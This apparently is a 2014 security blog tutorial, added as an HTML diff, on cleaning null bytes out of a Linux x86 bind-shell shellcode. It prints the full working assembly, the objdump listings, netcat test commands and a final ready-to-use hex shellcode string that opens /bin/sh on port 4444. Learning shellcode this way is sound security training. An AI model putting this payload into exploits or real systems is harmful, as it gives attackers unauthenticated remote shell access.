@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="norsec0de">
+<meta name="description" content="In Part 2: Building the shellcode, we created a bind shell on port 4444 which accepts connections from any host and then interacts with /bin/sh to facilitate remote code execution. Our shellcode however was littered with null bytes and would probably not be very useful if embedding in any exploit code.
+In this final part, we will clean our code and remove any null bytes from our shellcode. We will also look at removing unnecessary instruction to make our shellcode smaller if possible." />
+<meta name="keywords" content="infosec, norsey, norsec0de, assembly, shellcode, tutorial" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://norsec0de.github.io/posts/part-3-cleaning-and-optimising-shellcode/" />
+
+
+    <title>
+        
+            part 3: cleaning and optimising shellcode :: norsey&#39;s hideout 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="http://norsec0de.github.io/main.393856bf2c430bb6c01d7af07c6fe966e7cce8073435cfbbc46e590bab7405ef.css">
+
+
+
+
+
+
+<meta itemprop="name" content="part 3: cleaning and optimising shellcode">
+<meta itemprop="description" content="In Part 2: Building the shellcode, we created a bind shell on port 4444 which accepts connections from any host and then interacts with /bin/sh to facilitate remote code execution. Our shellcode however was littered with null bytes and would probably not be very useful if embedding in any exploit code.
+In this final part, we will clean our code and remove any null bytes from our shellcode. We will also look at removing unnecessary instruction to make our shellcode smaller if possible.">
+<meta itemprop="datePublished" content="2014-04-24T12:00:54+00:00" />
+<meta itemprop="dateModified" content="2014-04-24T12:00:54+00:00" />
+<meta itemprop="wordCount" content="1808">
+<meta itemprop="image" content="http://norsec0de.github.io/"/>
+
+
+
+<meta itemprop="keywords" content="assembly,shellcode,tutorial," />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="http://norsec0de.github.io/"/>
+
+<meta name="twitter:title" content="part 3: cleaning and optimising shellcode"/>
+<meta name="twitter:description" content="In Part 2: Building the shellcode, we created a bind shell on port 4444 which accepts connections from any host and then interacts with /bin/sh to facilitate remote code execution. Our shellcode however was littered with null bytes and would probably not be very useful if embedding in any exploit code.
+In this final part, we will clean our code and remove any null bytes from our shellcode. We will also look at removing unnecessary instruction to make our shellcode smaller if possible."/>
+
+
+
+
+
+    <meta property="article:section" content="shellcode" />
+
+    <meta property="article:section" content="tutorial" />
+
+
+
+    <meta property="article:published_time" content="2014-04-24 12:00:54 &#43;0000 &#43;0000" />
+
+
+
+
+
+
+
+
+    </head>
+
+    <body class="">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="http://norsec0de.github.io/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">norsey&#39;s hideout</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="http://norsec0de.github.io/posts">intel</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+
+            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="http://norsec0de.github.io/posts/part-3-cleaning-and-optimising-shellcode/">part 3: cleaning and optimising shellcode</a></h2>
+
+            
+
+            
+
+            <div class="post-content">
+                <p>In <a href="http://norsec0de.github.io/posts/part-2-building-the-shellcode/">Part 2: Building the shellcode</a>, we created a bind shell on port 4444 which accepts connections from any host and then interacts with <code>/bin/sh</code> to facilitate remote code execution. Our shellcode however was littered with null bytes and would probably not be very useful if embedding in any exploit code.</p>
+<p>In this final part, we will clean our code and remove any null bytes from our shellcode. We will also look at removing unnecessary instruction to make our shellcode smaller if possible. Lets get started.</p>
+<p>Step one, lets take a look at our shellcode using objdump:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">objdump -D bindshell -M intel
+</code></pre></div><pre><code class="language-objdump" data-lang="objdump">bindshell:     file format elf32-i386
+
+Disassembly of section .text:
+
+08048080 &lt;_start&gt;: 
+8048080:	31 c0                	xor    eax,eax
+8048082:	31 db                	xor    ebx,ebx
+8048084:	b8 66 00 00 00       	mov    eax,0x66
+8048089:	bb 01 00 00 00       	mov    ebx,0x1
+804808e:	31 c9                	xor    ecx,ecx
+8048090:	51                   	push   ecx
+8048091:	6a 01                	push   0x1
+8048093:	6a 02                	push   0x2
+8048095:	89 e1                	mov    ecx,esp
+8048097:	cd 80                	int    0x80
+8048099:	89 c2                	mov    edx,eax
+804809b:	31 c0                	xor    eax,eax
+804809d:	50                   	push   eax
+804809e:	66 68 11 5c          	pushw  0x5c11
+80480a2:	66 6a 02             	pushw  0x2
+80480a5:	89 e1                	mov    ecx,esp
+80480a7:	6a 10                	push   0x10
+80480a9:	51                   	push   ecx
+80480aa:	52                   	push   edx
+80480ab:	31 c0                	xor    eax,eax
+80480ad:	31 db                	xor    ebx,ebx
+80480af:	b8 66 00 00 00       	mov    eax,0x66
+80480b4:	bb 02 00 00 00       	mov    ebx,0x2
+80480b9:	89 e1                	mov    ecx,esp
+80480bb:	cd 80                	int    0x80
+80480bd:	31 c0                	xor    eax,eax
+80480bf:	50                   	push   eax
+80480c0:	52                   	push   edx
+80480c1:	89 e1                	mov    ecx,esp
+80480c3:	b8 66 00 00 00       	mov    eax,0x66
+80480c8:	31 db                	xor    ebx,ebx
+80480ca:	bb 04 00 00 00       	mov    ebx,0x4
+80480cf:	cd 80                	int    0x80
+80480d1:	31 c0                	xor    eax,eax
+80480d3:	50                   	push   eax
+80480d4:	50                   	push   eax
+80480d5:	52                   	push   edx
+80480d6:	89 e1                	mov    ecx,esp
+80480d8:	b8 66 00 00 00       	mov    eax,0x66
+80480dd:	31 db                	xor    ebx,ebx
+80480df:	bb 05 00 00 00       	mov    ebx,0x5
+80480e4:	cd 80                	int    0x80
+80480e6:	89 c2                	mov    edx,eax
+80480e8:	31 c0                	xor    eax,eax
+80480ea:	b8 3f 00 00 00       	mov    eax,0x3f
+80480ef:	89 d3                	mov    ebx,edx
+80480f1:	31 c9                	xor    ecx,ecx
+80480f3:	cd 80                	int    0x80
+80480f5:	31 c0                	xor    eax,eax
+80480f7:	b8 3f 00 00 00       	mov    eax,0x3f
+80480fc:	41                   	inc    ecx
+80480fd:	cd 80                	int    0x80
+80480ff:	31 c0                	xor    eax,eax
+8048101:	b8 3f 00 00 00       	mov    eax,0x3f
+8048106:	41                   	inc    ecx
+8048107:	cd 80                	int    0x80
+8048109:	31 c9                	xor    ecx,ecx
+804810b:	51                   	push   ecx
+804810c:	68 2f 2f 73 68       	push   0x68732f2f
+8048111:	68 2f 62 69 6e       	push   0x6e69622f
+8048116:	89 e3                	mov    ebx,esp
+8048118:	89 ca                	mov    edx,ecx
+804811a:	31 c0                	xor    eax,eax
+804811c:	b8 0b 00 00 00       	mov    eax,0xb
+8048121:	cd 80                	int    0x80
+</code></pre><pre><code>
+From this we can see the problematic instructions:
+
+```objdump
+8048084:	b8 66 00 00 00       	mov    eax,0x66
+8048089:	bb 01 00 00 00       	mov    ebx,0x1
+80480af:	b8 66 00 00 00       	mov    eax,0x66
+80480b4:	bb 02 00 00 00       	mov    ebx,0x2
+80480c3:	b8 66 00 00 00       	mov    eax,0x66
+80480ca:	bb 04 00 00 00       	mov    ebx,0x4
+80480d8:	b8 66 00 00 00       	mov    eax,0x66
+80480df:	bb 05 00 00 00       	mov    ebx,0x5
+80480ea:	b8 3f 00 00 00       	mov    eax,0x3f
+80480f7:	b8 3f 00 00 00       	mov    eax,0x3f
+8048101:	b8 3f 00 00 00       	mov    eax,0x3f
+804811c:	b8 0b 00 00 00       	mov    eax,0xb
+</code></pre><p>Lets break this down and tackle these one at a time. Firstly, we&rsquo;ll deal with our <code>eax</code> <code>syscall</code> values:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">b8 66 00 00 00       	mov    eax,0x66
+</code></pre></div><p>We can see that upon assembling, the compiler converted 102 to it&rsquo;s hex value of 0x66. Seeing as this is a single byte, maybe we can write it to just <code>al</code> (the smallest byte of eax) instead of the whole eax register.</p>
+<p>Metasploit has a great tool for this that can help you quickly find the values of assembly instructions called <a href="https://github.com/jjyg/metasm">metasm</a>.</p>
+<p>Note: If you do not have Metasploit installed, please follow the installation instructions provided by <a href="https://community.rapid7.com/docs/DOC-2100">Rapid7</a> or one of many great tutorials about installing Metasploit like this one from <a href="http://www.darkoperator.com/installing-metasploit-in-ubunt/">Carlos Perez</a> (<a href="https://twitter.com/Carlos_Perez">@darkoperator</a>).</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">/opt/metasploit-framework/tools/metasm_shell.rb
+</code></pre></div><p>Test the following instructions and see which ones return results with no null bytes:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">mov eax, 0x66
+mov ax, 0x66
+mov al, 0x66
+</code></pre></div><p><img src="http://i.imgur.com/ZmnEx3E.png" alt=""></p>
+<p>If we look at these results, the only one that is going to work for us is <code>mov al, 0x66</code>.</p>
+<p>Repeat this procedure for all the <code>mov eax, $$$</code> instructions:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">mov eax, 120     =&gt;  mov al, 0x66
+mov eax, 63      =&gt;  mov al, 0x3f
+mov eax, 11      =&gt;  mov al, 0xb
+</code></pre></div><p>Update these lines with the updated instructions into your code.</p>
+<p>We can use the same procedure for the <code>ebx</code> registers by changing them to the <code>bl</code> register.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">mov ebx, 1       =&gt;  mov bl, 0x1
+mov ebx, 2       =&gt;  mov bl, 0x2
+mov ebx, 4       =&gt;  mov bl, 0x4
+mov ebx, 5       =&gt;  mov bl, 0x5
+</code></pre></div><p>Take a look at your new assembly code:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#66d9ef">global</span> _start			
+
+<span style="color:#66d9ef">section</span> .text
+_start:
+
+		<span style="color:#75715e">; Start of our shellcode</span>
+
+		<span style="color:#75715e">; sys_socket (creating a socket for our connection)</span>
+
+		<span style="color:#a6e22e">xor</span> eax, eax       <span style="color:#75715e">; clear the value of eax </span>
+		<span style="color:#a6e22e">xor</span> ebx, ebx       <span style="color:#75715e">; clear the value of ebx </span>
+		<span style="color:#a6e22e">mov</span> al, <span style="color:#ae81ff">0x66</span>       <span style="color:#75715e">; set eax to 102 (sys_socketcall)</span>
+		<span style="color:#a6e22e">mov</span> bl, <span style="color:#ae81ff">0x1</span>        <span style="color:#75715e">; set ebx to 1 (sys_socket)</span>
+		<span style="color:#a6e22e">xor</span> ecx, ecx       <span style="color:#75715e">; clear the value of ecx</span>
+		<span style="color:#a6e22e">push</span> ecx           <span style="color:#75715e">; push a null onto the stack (IPPROTO_IP = 0)</span>
+		<span style="color:#a6e22e">push</span> <span style="color:#ae81ff">1</span>             <span style="color:#75715e">; push a 1 to the stack (SOCK_STREAM = 1)</span>
+		<span style="color:#a6e22e">push</span> <span style="color:#ae81ff">2</span>             <span style="color:#75715e">; push a 2 to the stack (AF_INET = 2)</span>
+		<span style="color:#a6e22e">mov</span> ecx, esp       <span style="color:#75715e">; push the location of our arguments into ecx</span>
+		<span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>           <span style="color:#75715e">; call sys_socket</span>
+		<span style="color:#a6e22e">mov</span> edx, eax       <span style="color:#75715e">; save the returned value to edx (socket file descriptor)</span>
+
+		<span style="color:#75715e">; sys_bind (bind a port number to our socket)</span>
+
+		<span style="color:#a6e22e">xor</span> eax, eax       <span style="color:#75715e">; clear the value of eax</span>
+		<span style="color:#a6e22e">push</span> eax           <span style="color:#75715e">; push eax to the stack as it&#39;s null (INADDR_ANY = 0)</span>
+		<span style="color:#a6e22e">push</span> <span style="color:#66d9ef">WORD</span> <span style="color:#ae81ff">0x5C11</span>   <span style="color:#75715e">; push our port number to the stack (Port = 4444)</span>
+		<span style="color:#a6e22e">push</span> <span style="color:#66d9ef">WORD</span> <span style="color:#ae81ff">2</span>        <span style="color:#75715e">; push protocol argument to the stack (AF_INET = 2)</span>
+		<span style="color:#a6e22e">mov</span> ecx, esp       <span style="color:#75715e">; mov value of esp into ecx, the location of our sockaddr arguments</span>
+		<span style="color:#a6e22e">push</span> <span style="color:#ae81ff">16</span>            <span style="color:#75715e">; push addrlen to stack (addrlen = 16)</span>
+		<span style="color:#a6e22e">push</span> ecx           <span style="color:#75715e">; push ecx to stack (ecx = location of our sockaddr arguments)</span>
+		<span style="color:#a6e22e">push</span> edx           <span style="color:#75715e">; push edx (sockfd value stored in edx)</span>
+		<span style="color:#a6e22e">xor</span> eax, eax       <span style="color:#75715e">; clear value of eax</span>
+		<span style="color:#a6e22e">xor</span> ebx, ebx       <span style="color:#75715e">; clear value of ebx</span>
+		<span style="color:#a6e22e">mov</span> al, <span style="color:#ae81ff">0x66</span>       <span style="color:#75715e">; move value of 102 into eax (sys_sockcall = 102)</span>
+		<span style="color:#a6e22e">mov</span> bl, <span style="color:#ae81ff">0x2</span>        <span style="color:#75715e">; move value of 2 into eax (sys_bind = 2)</span>
+		<span style="color:#a6e22e">mov</span> ecx, esp       <span style="color:#75715e">; move the arguments into ecx</span>
+		<span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>           <span style="color:#75715e">; call sys_bind</span>
+
+		<span style="color:#75715e">; sys_listen (listen on our created socket)</span>
+
+		<span style="color:#a6e22e">xor</span> eax, eax       <span style="color:#75715e">; clear value of eax </span>
+		<span style="color:#a6e22e">push</span> eax           <span style="color:#75715e">; push backlog argument to stack (backlog = 0)</span>
+		<span style="color:#a6e22e">push</span> edx           <span style="color:#75715e">; push the sockfd argument to stack (sockfd stored in edx)</span>
+		<span style="color:#a6e22e">mov</span> ecx, esp       <span style="color:#75715e">; store the location of our arguments into ecx</span>
+		<span style="color:#a6e22e">mov</span> al, <span style="color:#ae81ff">0x66</span>       <span style="color:#75715e">; sets the value 102 which is the syscall number for sys_socketcall</span>
+		<span style="color:#a6e22e">xor</span> ebx, ebx       <span style="color:#75715e">; clear value of ebx to 0</span>
+		<span style="color:#a6e22e">mov</span> bl, <span style="color:#ae81ff">0x4</span>        <span style="color:#75715e">; sets the value 4 which is the value for &#34;listen&#34; in sys_socketcall</span>
+		<span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>           <span style="color:#75715e">; call sys_listen</span>
+
+		<span style="color:#75715e">; sys_accept (accept connections on our created port)</span>
+
+		<span style="color:#a6e22e">xor</span> eax, eax       <span style="color:#75715e">; clear value of eax</span>
+		<span style="color:#a6e22e">push</span> eax           <span style="color:#75715e">; push addrlen argument to stack (addrlen = 0)</span>
+		<span style="color:#a6e22e">push</span> eax           <span style="color:#75715e">; push addr argument to stack (addr = 0)</span>
+		<span style="color:#a6e22e">push</span> edx           <span style="color:#75715e">; push the sockfd argument to stack (sockfd stored in edx)</span>
+		<span style="color:#a6e22e">mov</span> ecx, esp       <span style="color:#75715e">; move the location of our arguments into ecx</span>
+		<span style="color:#a6e22e">mov</span> al, <span style="color:#ae81ff">0x66</span>       <span style="color:#75715e">; sets the value 102 which is the syscall number for sys_socketcall</span>
+		<span style="color:#a6e22e">xor</span> ebx, ebx       <span style="color:#75715e">; clear value of ebx</span>
+		<span style="color:#a6e22e">mov</span> bl, <span style="color:#ae81ff">0x5</span>        <span style="color:#75715e">; sets the value 5 which is the value for sys_accept</span>
+		<span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>           <span style="color:#75715e">; call sys_accept</span>
+		<span style="color:#a6e22e">mov</span> edx, eax       <span style="color:#75715e">; save the return value from sys_accept to edx (client file descriptor)</span>
+
+		<span style="color:#75715e">; sys_dup2 (create file descriptors for stdin, stdout and stderr so we can see the responses from execve)</span>
+
+		<span style="color:#a6e22e">xor</span> eax, eax       <span style="color:#75715e">; clear value of eax</span>
+		<span style="color:#a6e22e">mov</span> al, <span style="color:#ae81ff">0x3f</span>       <span style="color:#75715e">; sets the value 63 which is the syscall number for sys_dup2</span>
+		<span style="color:#a6e22e">mov</span> ebx, edx       <span style="color:#75715e">; move the stored oldfd argument to ebx (stored in edx)</span>
+		<span style="color:#a6e22e">xor</span> ecx, ecx       <span style="color:#75715e">; set ecx to 0 for stdin</span>
+		<span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>           <span style="color:#75715e">; call sys_dup2</span>
+		<span style="color:#a6e22e">xor</span> eax, eax       <span style="color:#75715e">; clear value of eax</span>
+		<span style="color:#a6e22e">mov</span> al, <span style="color:#ae81ff">0x3f</span>       <span style="color:#75715e">; sets the value 63 which is the syscall number for sys_dup2</span>
+		<span style="color:#a6e22e">inc</span> ecx            <span style="color:#75715e">; increment ecx to 1 for stdout</span>
+		<span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>           <span style="color:#75715e">; call sys_dup2</span>
+		<span style="color:#a6e22e">xor</span> eax, eax       <span style="color:#75715e">; clear value of eax</span>
+		<span style="color:#a6e22e">mov</span> al, <span style="color:#ae81ff">0x3f</span>       <span style="color:#75715e">; sets the value 63 which is the syscall number for sys_dup2</span>
+		<span style="color:#a6e22e">inc</span> ecx            <span style="color:#75715e">; increment ecx to 2 for stderr</span>
+		<span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>           <span style="color:#75715e">; call sys_dup2</span>
+
+		<span style="color:#75715e">; sys_execve (execute /bin//sh upon connecting and pass the responses back to connector)</span>
+
+		<span style="color:#a6e22e">xor</span> ecx, ecx       <span style="color:#75715e">; clear value of ecx, args argument = 0</span>
+		<span style="color:#a6e22e">push</span> ecx           <span style="color:#75715e">; push a null to the stack to terminate our filename</span>
+		<span style="color:#a6e22e">push</span> <span style="color:#ae81ff">0x68732f2f</span>    <span style="color:#75715e">; push //sh to the stack (second part of /bin//sh)</span>
+		<span style="color:#a6e22e">push</span> <span style="color:#ae81ff">0x6e69622f</span>    <span style="color:#75715e">; push /bin to the stack (first part of /bin//sh</span>
+		<span style="color:#a6e22e">mov</span> ebx, esp       <span style="color:#75715e">; set ebx with the location of our file name on the stack</span>
+		<span style="color:#a6e22e">mov</span> edx, ecx       <span style="color:#75715e">; move null value for envp argument into edx</span>
+		<span style="color:#a6e22e">xor</span> eax, eax       <span style="color:#75715e">; clear value of eax</span>
+		<span style="color:#a6e22e">mov</span> al, <span style="color:#ae81ff">0xb</span>        <span style="color:#75715e">; sets the value 11 which is the syscall number for sys_execve</span>
+		<span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>           <span style="color:#75715e">; call sys_execve</span>
+</code></pre></div><p>Lets look at the shellcode in objdump if we have any null bytes:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">objdump -D bindshell -M intel | grep <span style="color:#ae81ff">00</span>
+</code></pre></div><p>Great, lets check for other known bad characters such as <code>\x0a</code> and <code>\x0d</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">objdump -D bindshell -M intel | grep 0a
+objdump -D bindshell -M intel | grep 0d
+</code></pre></div><p>Awesome, none of those are in our shell so lets test and see if it still works.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">./bindshell
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">netstat -antp
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nc -nv 127.0.0.1 <span style="color:#ae81ff">4444</span>
+id
+</code></pre></div><p><img src="http://i.imgur.com/EOg9Ii6.png" alt=""></p>
+<p>Our clean shell is still working.</p>
+<p>Last step is to dump this for use in our exploits:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">./getshell.sh bindshell
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">\x31\xc0\x31\xdb\xb0\x66\xb3\x01\x31\xc9\x51\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89
+\xc2\x31\xc0\x50\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x31\xc0\x31
+\xdb\xb0\x66\xb3\x02\x89\xe1\xcd\x80\x31\xc0\x50\x52\x89\xe1\xb0\x66\x31\xdb\xb3
+\x04\xcd\x80\x31\xc0\x50\x50\x52\x89\xe1\xb0\x66\x31\xdb\xb3\x05\xcd\x80\x89\xc2
+\x31\xc0\xb0\x3f\x89\xd3\x31\xc9\xcd\x80\x31\xc0\xb0\x3f\x41\xcd\x80\x31\xc0\xb0
+\x3f\x41\xcd\x80\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89
+\xca\x31\xc0\xb0\x0b\xcd\x80
+</code></pre></div><p>This concludes this training on shellcode writing in assembly. If you just follow the steps and do research, anything is possible. My goal when starting this post was to make shellcode less intimidating and if you feel that you have walked away after reading this with a better understanding of how shellcode interacts with the system then I am satisfied.</p>
+<p>I hope to create more posts as I head further down this SLAE and I recommend that anyone who is in the information security field take the course and let Vivek turn you into a shellcode ninja.</p>
+<p>Keep on sploiting,</p>
+<p>norsec0de</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="http://norsec0de.github.io/tags/assembly/">assembly</a></span>
+        <span class="tag"><a href="http://norsec0de.github.io/tags/shellcode/">shellcode</a></span>
+        <span class="tag"><a href="http://norsec0de.github.io/tags/tutorial/">tutorial</a></span>
+        
+    </p>
+
+            
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
+
+        <span class="tag"><a href="http://norsec0de.github.io/categories/shellcode/">shellcode</a></span>
+        <span class="tag"><a href="http://norsec0de.github.io/categories/tutorial/">tutorial</a></span>
+        
+    </p>
+
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2020</span>
+            
+                <span><a href="http://norsec0de.github.io/">norsey</a></span>
+            
+            <span><a href="http://norsec0de.github.io/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>norsey's hideout</span>
+            <span>hugo</span>
+          </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="http://norsec0de.github.io/bundle.min.dc716e9092c9820b77f96da294d0120aeeb189b5bcea9752309ebea27fd53bbe6b13cffb2aca8ecf32525647ceb7001f76091de4199ac5a3caa432c070247f5b.js" integrity="sha512-3HFukJLJggt3&#43;W2ilNASCu6xibW86pdSMJ6&#43;on/VO75rE8/7KsqOzzJSVkfOtwAfdgkd5BmaxaPKpDLAcCR/Ww=="></script>
+
+
+
+    </body>
+</html>
